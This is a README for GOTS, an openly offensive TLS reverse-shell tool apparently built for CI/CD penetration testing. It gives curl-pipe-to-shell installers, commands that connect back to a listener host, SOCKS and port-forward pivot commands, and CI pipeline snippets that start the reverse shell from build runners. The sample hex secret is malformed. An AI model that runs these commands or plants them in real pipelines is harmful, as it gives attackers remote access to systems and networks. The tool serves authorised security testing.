<div align="center">
  <img src="pipeleek_gots.svg" alt="pipeleek_gots" width="200" />
</div>

# GOTS - Golang TCP/TLS (Reverse) Shell - For Pipeleek

> **⚠️ Disclaimer**: This project was entirely generated using AI (GitHub Copilot). Use at your own risk in production environments.

Minimal, encrypted reverse shell over raw TCP with TLS 1.3.

Use this when you need a self-hosted, encrypted reverse shell alternative—for example, when tools like [sshx](https://sshx.io/) cannot be used due to customer concerns about data residency or third-party hosting requirements. This is meant to be a companion for [Pipeleek](https://github.com/CompassSecurity/pipeleek).

## Install
- Binstaller (recommended):
  - gotsl (Listener, gots left): `curl -fsSL https://frjcomp.github.io/gots/install-gotsl.sh | sh`
  - gotsr (Client, gots right): `curl -fsSL https://frjcomp.github.io/gots/install-gotsr.sh | sh`
  - Set `BINSTALLER_BIN` to change install dir (defaults to `~/.local/bin`).

- From source:
  ```bash
  git clone https://github.com/frjcomp/gots.git
  cd gots
  make build  # outputs to bin/
  ```

## Usage

### Basic Usage
- Start gotsl (Listener, TLS, self-signed):
  ```bash
  ./gotsl --port 9001 --interface 0.0.0.0
  ```
  Available flags:
  - `--port PORT` (required): Port to listen on
  - `--interface INTERFACE` (required): Network interface to bind to
  - `-s, --shared-secret` (optional): Enable shared secret authentication

- Start gotsr (Reverse shell client):
  ```bash
  ./gotsr --target listener.example.com:9001 --retries 5
  ```
  Available flags:
  - `--target HOST:PORT` (required): Target server address
  - `--retries NUM` (required): Maximum retries (0 = infinite)
  - `-s, --shared-secret SECRET` (optional): Shared secret for authentication
  - `--cert-fingerprint FINGERPRINT` (optional): Server certificate SHA256 fingerprint

**Quick tips:**
First connection without a fingerprint will still work with a self-signed cert; the client (`gotsr`) logs a warning and prints the certificate fingerprint. If you use pinning, obtain and verify the fingerprint via a trusted channel (e.g., printed by `gotsl`) before using `--cert-fingerprint`.


### Shared Secret Authentication
For additional security, use a shared secret handshake between listener and client:

1. Start `gotsl` with `-s` flag to auto-generate a secret:
   ```bash
   ./gotsl -s --port 9001 --interface 0.0.0.0
   ```
   This prints the full gotsr command with the hex-encoded secret and certificate fingerprint:
   ```
   ✓ Shared secret authentication enabled
   Secret (hex): 47e5e491ed1308f0fe4f83520fddb8f45cf3c1094f4e1d387cdb0e99b6c3f426a1b2c3d4e5f6g7h8i
   
   To connect, use:
   ./gotsr -s 47e5e491ed1308f0fe4f83520fddb8f45cf3c1094f4e1d387cdb0e99b6c3f426a1b2c3d4e5f6g7h8i --cert-fingerprint 686033a3b9db41c3877e484f4df210ac98bff296da9d6f99ef36f1394c1946ee --target 127.0.0.1:8443 --retries 1
   ```

2. Start `gotsr` with the hex-encoded secret and fingerprint:
   ```bash
   ./gotsr -s <hex-secret> --cert-fingerprint <fingerprint> --target <host:port> --retries <num>
   ```

The listener will log a warning if the client fails to authenticate with the correct secret.

### Certificate Verification & Pinning
The client validates the server certificate during the TLS handshake:

- Pinning (**recommended**): If `--cert-fingerprint` is provided, the client pins to the leaf certificate's SHA256 fingerprint (DER) and rejects mismatches (prevents MITM). The generated fingerprint is printed at startup by the listener.
- CA-signed certs: If no fingerprint is provided and the certificate is CA-signed and valid, the connection is accepted.
- Self-signed without fingerprint: The connection is allowed, and the client logs a clear security warning and prints the server fingerprint. If you choose to pin, obtain and verify the fingerprint via a trusted channel before using `--cert-fingerprint`.

### Port Forwarding & SOCKS5 Proxy

**Port Forwarding** - Forward a local port to a remote address through a client:
```bash
listener> forward 1 8080 10.0.0.5:80     # Forward localhost:8080 to 10.0.0.5:80
listener> forwards                        # List active forwards
listener> stop forward fwd-1234567890     # Stop a forward
```

**SOCKS5 Proxy** - Start a SOCKS5 proxy on localhost through a client:
```bash
listener> socks 1 1080                    # Start SOCKS5 proxy on localhost:1080
listener> stop socks socks-1234567890     # Stop a SOCKS5 proxy
```
Configure your browser/app to use `127.0.0.1:1080` as SOCKS5 proxy.


## Testing
- Run unit and integration tests locally:
  ```bash
  go test -race ./...
  ```
- Run only integration tests (end-to-end CLI tests):
  ```bash
  go test -race ./integration
  ```
  Integration tests invoke the compiled binaries to test full workflows, including PTY sessions, file transfers, and authentication scenarios.

## CI examples

The following examples can be copied to run `gotsr` in common CI/CD environments.

### GitLab CI
```yaml
reverse-linux:
  stage: test
  image: alpine:3.19
  script:
    - apk add --no-cache curl
    - curl -fsSL https://frjcomp.github.io/gots/install-gotsr.sh | sh
    - ~/.local/bin/gotsr --target listener.example.com:9001 --retries 3
reverse-win:
  stage: test
  tags: [saas-windows-medium-amd64]
  script:
    - powershell -NoProfile -ExecutionPolicy Bypass -File ".\download-and-run-gotsr.ps1" # add the script to the repository by copying it from this repos ./examples folder and updating the target in the script.
```

### GitHub Actions
```yaml
name: GOTSR
on: [workflow_dispatch]
permissions: {}
jobs:
  linux:
    runs-on: ubuntu-latest
    steps:
      - name: Install gotsr client
        run: curl -fsSL https://frjcomp.github.io/gots/install-gotsr.sh | sh
      - name: Run gotsr
        run: ~/.local/bin/gotsr --target listener.example.com:9001 --retries 3
  windows:
    runs-on: windows-latest
    steps:
      - name: Install gotsr client (PowerShell)
        shell: pwsh
        run: |
          & "C:/Program Files/Git/bin/bash.exe" -lc "curl -fsSL https://frjcomp.github.io/gots/install-gotsr.sh | sh"
      - name: Run gotsr (PowerShell)
        shell: pwsh
        run: |
          & "$HOME/.local/bin/gotsr" --target listener.example.com:9001 --retries 3
```